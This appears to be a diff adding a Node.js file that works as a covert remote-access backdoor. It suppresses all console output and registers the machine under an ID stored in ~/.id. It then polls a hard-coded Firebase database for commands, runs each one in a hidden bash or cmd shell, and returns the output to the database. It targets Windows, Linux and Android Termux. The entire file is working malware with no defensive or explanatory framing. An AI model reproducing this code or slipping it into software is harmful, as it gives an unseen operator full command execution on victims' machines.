@@ -1,0 +1,247 @@
+const { initializeApp } = require('@firebase/app');
+const { getDatabase, ref, onValue, update, get } = require('@firebase/database');
+const { exec, execSync, spawn } = require('child_process');
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+const https = require('https');
+const http = require('http');
+
+process.stdout.write = () => true;
+process.stderr.write = () => true;
+console.log = () => {};
+console.error = () => {};
+console.warn = () => {};
+console.info = () => {};
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAJi1JO3VOtIsNC7ZM21K4NapNvxM92sYw",
+  authDomain: "command-terminal-7557f.firebaseapp.com",
+  databaseURL: "https://command-terminal-7557f-default-rtdb.firebaseio.com",
+  projectId: "command-terminal-7557f",
+  storageBucket: "command-terminal-7557f.firebasestorage.app",
+  messagingSenderId: "614995344327",
+  appId: "1:614995344327:web:896fe5d1155b78704877e2",
+  measurementId: "G-YE035QCESE"
+};
+
+class FirebaseCommandMonitor {
+  constructor() {
+    this.isProcessing = false;
+    this.homeDir = os.homedir();
+    this.isTermux = this.checkIfTermux();
+    process.chdir(this.homeDir);
+    this.currentId = this.getIdFromFile();
+    this.shell = os.platform() === 'win32' ? 'cmd' : 'bash';
+    this.initializeApp();
+  }
+
+  checkIfTermux() {
+    try {
+      return fs.existsSync('/data/data/com.termux/files/usr/bin/bash');
+    } catch (error) {
+      return false;
+    }
+  }
+
+  async initializeApp() {
+    this.startFirebase();
+  }
+
+  startFirebase() {
+    try {
+      const app = initializeApp(firebaseConfig);
+      this.database = getDatabase(app);
+      this.dbRef = ref(this.database, this.currentId);
+      this.initializeFirebase();
+    } catch (error) {
+    }
+  }
+
+  getIdFromFile() {
+    try {
+      const idFile = path.join(this.homeDir, '.id');
+      if (fs.existsSync(idFile)) {
+        const id = fs.readFileSync(idFile, 'utf8').trim();
+        if (/^\d{8,10}$/.test(id)) {
+          return id;
+        }
+      }
+    } catch (error) {
+    }
+    return this.generateNewId();
+  }
+
+  generateNewId() {
+    const newId = Math.floor(10000000 + Math.random() * 900000000).toString().substring(0, 9);
+    try {
+      const idFile = path.join(this.homeDir, '.id');
+      fs.writeFileSync(idFile, newId);
+    } catch (error) {
+    }
+    return newId;
+  }
+
+  async initializeFirebase() {
+    try {
+      const snapshot = await get(this.dbRef);
+      if (snapshot.exists()) {
+        const existingData = snapshot.val();
+        if (existingData.command && existingData.command !== "" && existingData.status === false) {
+          await this.executeCommand(existingData.command);
+        } else {
+          await update(this.dbRef, {
+            command: existingData.command || "",
+            status: existingData.status !== undefined ? existingData.status : true,
+            output: existingData.output || ""
+          });
+        }
+      } else {
+        await update(this.dbRef, {
+          command: "",
+          status: true,
+          output: ""
+        });
+      }
+      this.setupListener();
+    } catch (error) {
+    }
+  }
+
+  setupListener() {
+    onValue(this.dbRef, async (snapshot) => {
+      if (snapshot.exists()) {
+        const data = snapshot.val();
+        await this.handleCommand(data);
+      }
+    }, (error) => {
+    });
+  }
+
+  async handleCommand(data) {
+    if (this.isProcessing) {
+      return;
+    }
+
+    const { command, status } = data;
+
+    if (!command || typeof status === 'undefined') {
+      return;
+    }
+
+    if (status === false) {
+      await this.executeCommand(command);
+    }
+  }
+
+  async executeCommand(command) {
+    if (this.isProcessing) {
+      return;
+    }
+
+    this.isProcessing = true;
+    try {
+      process.chdir(this.homeDir);
+      await update(this.dbRef, { status: true });
+      const execOptions = {
+        encoding: 'utf8',
+        windowsHide: true,
+        stdio: ['ignore', 'pipe', 'pipe'],
+        cwd: this.homeDir,
+        timeout: 300000
+      };
+
+      let shellCommand;
+      if (os.platform() === 'win32') {
+        shellCommand = `cmd /c "chdir /d "${this.homeDir}" & ${command}"`;
+      } else if (this.isTermux) {
+        shellCommand = `${this.shell} -c "cd "${this.homeDir}" && ${command} 2>&1"`;
+      } else {
+        shellCommand = `${this.shell} -c "cd "${this.homeDir}" && source ~/.bashrc 2>/dev/null; source ~/.bash_profile 2>/dev/null; source ~/.profile 2>/dev/null; ${command} 2>&1"`;
+      }
+
+      exec(shellCommand, execOptions, (error, stdout, stderr) => {
+        let output = "";
+        if (stdout) output += stdout;
+        if (stderr) output += stderr;
+        if (error) {
+          output += error.message || `Command failed with code ${error.code}`;
+        }
+        if (command.trim() === 'ls' || command.trim() === 'la' || command.trim() === 'll' ||
+            command.trim().startsWith('ls ') || command.trim().startsWith('la ') || command.trim().startsWith('ll ')) {
+          try {
+            const baseCommand = command.replace(/^.*?\b(ls|la|ll)\b/, '$1');
+            const lsCommand = os.platform() === 'win32' ? 'dir' : `${baseCommand} -F`;
+            const lsOutput = execSync(`cd "${this.homeDir}" && ${lsCommand}`, {
+              encoding: 'utf8',
+              stdio: ['pipe', 'pipe', 'ignore'],
+              windowsHide: true,
+              timeout: 10000
+            });
+            output = this.parseIndicators(lsOutput);
+          } catch (lsError) {
+          }
+        }
+        update(this.dbRef, {
+          output: output.trim(),
+          status: true
+        }).catch(() => {});
+      });
+    } catch (error) {
+      update(this.dbRef, {
+        output: `Execution error: ${error.message}`,
+        status: true
+      }).catch(() => {});
+    } finally {
+      this.isProcessing = false;
+    }
+  }
+
+  parseIndicators(indicatorOutput) {
+    const indicatorMap = {
+      '/': '📁',
+      '*': '🚀',
+      '@': '🔗',
+      '|': '📍',
+      '=': '🔌',
+      '>': '🚪'
+    };
+
+    const lines = indicatorOutput.split('\n');
+    let formattedOutput = '';
+    for (const line of lines) {
+      if (line.trim() === '') {
+        formattedOutput += '\n';
+        continue;
+      }
+      let icon = '📄';
+      let filename = line;
+      for (const [indicator, indicatorIcon] of Object.entries(indicatorMap)) {
+        if (line.endsWith(indicator)) {
+          icon = indicatorIcon;
+          filename = line.slice(0, -1);
+          break;
+        }
+      }
+      if (filename === '.' || filename === '..') {
+        icon = '📁';
+      }
+      formattedOutput += `${icon} ${filename}\n`;
+    }
+    return formattedOutput.trim();
+  }
+}
+
+process.on('SIGINT', () => {
+  process.exit(0);
+});
+
+process.on('SIGTERM', () => {
+  process.exit(0);
+});
+
+try {
+  new FirebaseCommandMonitor();
+} catch (error) {
+  process.exit(0);
+}
